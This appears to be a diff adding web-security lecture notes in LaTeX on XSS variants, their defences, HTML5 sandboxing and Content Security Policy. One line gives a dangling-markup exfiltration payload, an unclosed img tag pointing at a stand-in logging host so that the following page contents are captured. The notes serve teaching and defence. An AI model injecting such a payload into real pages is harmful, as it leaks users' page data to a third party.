@@ -795,5 +795,117 @@
 			\end{itemize}
 		\end{itemize}
 	\end{itemize}
+	
+	\subsection{Client-side injection attacks}
+	\begin{itemize}
+		\item Traditional XSS attacks
+		\begin{itemize}
+			\item Cross-Site Scripting
+			\item Attacker executes code in the browsing context, possesses the full power of JavaScript
+			\item Consequences
+			\begin{itemize}
+				\item defacement of the page
+				\item stealing sensitive information from the browser
+				\item advanced JavaScript payloads (keyloggers, network scanners)
+			\end{itemize}
+			\item Reflected XSS
+			\begin{itemize}
+				\item Payload is sent to the server as part of requested data
+				\item Server incorporates payload into the HTML page of the response
+				\item Payload is executed in the browser
+				\item Attacker can embed an \texttt{iframe} with a request with a payload in another site to execute it in the victim's browser
+			\end{itemize}
+			\item Stored XSS
+			\begin{itemize}
+				\item Payload is stored in the database
+				\item Attacker's code is executed when the user's browser renders the page containing this database information
+				\item Attack happens within the application, does not involve a cross-site request
+			\end{itemize}
+		\end{itemize}
+	
+		\item Common defences against XSS attacks
+		\begin{itemize}
+			\item Strict input validation
+			\begin{itemize}
+				\item Prevent dangerous characters or strings: \texttt{<}, \texttt{>}, \texttt{<script>}
+				\item Helps avoid confusion between data and code
+			\end{itemize}
+			\item Output encoding
+			\begin{itemize}
+				\item Encoded characters are harmless
+				\item Context-sensitive output encoding
+					\subitem context determines which characters need to be encoded \textrightarrow \ library
+			\end{itemize}
+			\item Rich-text data
+			\begin{itemize}
+				\item Can not be combined with output encoding
+				\item Sanitization: analyse contents and removes dangerous parts
+			\end{itemize}
+		\end{itemize}
+	
+		\item DOM-based XSS attacks
+		\begin{itemize}
+			\item Pages can also be modified on the client with JavaScript
+			\item Client-side XSS vulnerabilities exist as well
+			\item Occurs when legitimate code modifies the DOM in an insecure way
+				\subitem by taking a piece of data from the URL (can be modified \textrightarrow \ untrusted)
+			\item Elimination DOM-based XSS vulnerabilities
+			\begin{itemize}
+				\item use proper DOM APIs
+				\item context-sensitive encoding of untrusted data
+				\item client-side sanitization libraries
+			\end{itemize}
+		\end{itemize}
+	\end{itemize}
+
+	\subsection{Advanced client-side attacks and defences}
+	\begin{itemize}
+		\item Alternative injection attack vectors
+		\begin{itemize}
+			\item Not only JS code can be injected through XSS: also HTML, CSS, ...
+			\item Data exfiltration by inserting non-closed tags with URL
+			\begin{itemize}
+				\item \texttt{<img src=`https://ex.com/log.php?} can capture all following page contents until the next single quote '
+			\end{itemize}
+			\item Hijacking relative URLs by injecting a base tag
+			\item Modifying form parameters (field values, destinations, ...)
+			\item Prevention:
+			\begin{itemize}
+				\item Avoid confusion between data and code
+				\item Context-sensitive output encoding works perfectly
+				\item Sanitization is tricky, since the content seems harmless
+			\end{itemize}
+		\end{itemize}
+	
+		\item HTML5 sandboxing
+		\begin{itemize}
+			\item Origin-based context isolation
+			\begin{itemize}
+				\item leverages the Same-Origin Policy.
+				\item isolates main application from untrusted parts
+			\end{itemize}
+			\item Sandbox attribute
+			\begin{itemize}
+				\item impose constraints on the behaviour of the content
+				\item default: content has a unique origin, no script execution, no form submission, no external navigation, no pop-ups, no plug-in content, no full-screen capabilities
+			\end{itemize}
+		\end{itemize}
+	
+		\item Content Security Policy (CSP)
+		\begin{itemize}
+			\item Defines the intended behaviour of a page and prevents actions that violate these intentions
+			\item You can specify where each type of resources can originate from
+			\item \texttt{script-src `self';} prevents the execution of \textbf{remote or in-line scripts}
+			\item Static content (images, fonts, media) will only be loaded by the browser if they are whitelisted
+			\item Report feature: browser will send reports about detected violations
+			\item Report-only mode: content is loaded but a report is sent when violation is detected
+			\item Hashes and nonces: replace unsafe-inline
+			\begin{itemize}
+				\item Hash: calculated on contents of a script block
+				\item Nonce: random and unique value
+			\end{itemize}
+		\end{itemize}
+	\end{itemize}
+	
 \end{document}
 
